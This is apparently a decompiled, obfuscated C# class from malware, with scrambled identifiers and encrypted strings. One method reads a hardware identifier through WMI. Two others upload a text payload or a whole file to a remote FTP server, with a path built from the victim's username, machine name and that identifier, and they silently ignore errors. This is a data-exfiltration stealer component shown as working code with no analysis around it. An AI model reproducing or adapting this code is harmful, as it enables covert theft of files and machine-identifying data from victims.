using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace nVxbvhuaKzC;

internal sealed class hdkhpYUKtylncPr
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string GNhfBZvUwCJTZVIF()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107410984));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107410995)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107410946);
			ManagementObject val3 = new ManagementObject(getString_0(107410941) + text2 + getString_0(107410932));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107410927)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107389319) : text;
		}
	}

	public static void MLkepTeFGkIBE(string WNjYSfPVPVW = "URL", string LcuLyHRVSY = "USERNAME", string WOAgUatyKpY = "ACCESO", string XzDsCpiUonuptlN = "")
	{
		try
		{
			string text = GNhfBZvUwCJTZVIF();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(WNjYSfPVPVW + getString_0(107412327) + Environment.UserName + getString_0(107412314) + Environment.MachineName + getString_0(107412293) + text + getString_0(107412288));
			ftpWebRequest.Method = getString_0(107410390);
			ftpWebRequest.Credentials = new NetworkCredential(LcuLyHRVSY, WOAgUatyKpY);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(XzDsCpiUonuptlN);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void xRNINHsHor(string ifilzcNNNrethT = "URL", string aCZPnvYeGyx = "USERNAME", string MdYqjwAyWfJsC = "ACCESO", string QnmtXIzIacLoE = "")
	{
		try
		{
			string text = GNhfBZvUwCJTZVIF();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(ifilzcNNNrethT + getString_0(107412327) + Environment.UserName + getString_0(107412314) + Environment.MachineName + getString_0(107412293) + text + getString_0(107412293) + Path.GetFileName(QnmtXIzIacLoE));
			ftpWebRequest.Method = getString_0(107410390);
			ftpWebRequest.Credentials = new NetworkCredential(aCZPnvYeGyx, MdYqjwAyWfJsC);
			byte[] array = File.ReadAllBytes(QnmtXIzIacLoE);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static hdkhpYUKtylncPr()
	{
		Strings.CreateGetStringDelegate(typeof(hdkhpYUKtylncPr));
	}
}
